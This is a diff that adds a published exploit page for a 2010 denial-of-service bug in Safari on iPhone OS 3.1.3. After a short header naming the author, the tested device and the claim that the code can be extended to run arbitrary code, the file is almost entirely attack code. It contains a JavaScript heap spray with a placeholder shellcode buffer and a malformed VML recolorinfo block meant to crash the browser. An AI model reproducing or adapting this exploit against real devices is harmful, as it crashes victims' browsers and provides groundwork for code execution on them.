@@ -1,0 +1,180 @@
+# Exploit Title: Bad "VML" Remote DoS on Safari for iPhone & iPod Touch
+
+# Date: 26/03/2010
+
+# Author: Nishant Das Patnaik
+# For more of Nishant's research, please visit:
+# http://nishantdaspatnaik.yolasite.com/research.php
+
+# Tested on: iPod Touch 3G (iPhone OS 3.1.3)
+
+# Description: An attacker may direct the user to visit a specially crafted webpage that can lead the Safari browser on iPhone & iPod Touch running iPhone OS 3.1.3 to freeze and finally crash. The attacker can modify to the PoC to run arbitrary code on the device.
+ 
+# Code:
+
+---------PoC STARTS HERE----------------
+
+<html xmlns:v="urn:schemas-microsoft-com:vml">
+<title>Bad "VML" Remote DoS on Safari for iPhone & iPod Touch</title>
+<head>
+<object id="VMLRender"
+classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
+</object>
+<style>
+v\:* { behavior: url(#VMLRender); }
+</style>
+</head>
+<body>
+<SCRIPT language="javascript">
+shellcode = unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
+bigblock = unescape("%u0000%u0000");
+headersize = 20;
+slackspace = headersize+shellcode.length;
+while (bigblock.length<slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace<0x40000) block = block+block+fillblock;
+memory = new Array();
+for (i=0;i<350;i++) memory[i] = block + shellcode;
+</script>
+<v:rect style='width:120pt;height:80pt' fillcolor="red" >
+<v:recolorinfo recolorstate="t" numcolors="97612895">
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v:recolorinfoentry tocolor="rgb(1,1,1)" recolortype="1285"
+lbcolor="rgb(1,1,1)" forecolor="rgb(1,1,1)" backcolor="rgb(1,1,1)"
+fromcolor="rgb(1,1,1)" lbstyle ="32" bitmaptype="3"/>
+<v/recolorinfo>
+</html>
+
+---------POC ENDS HERE----------------
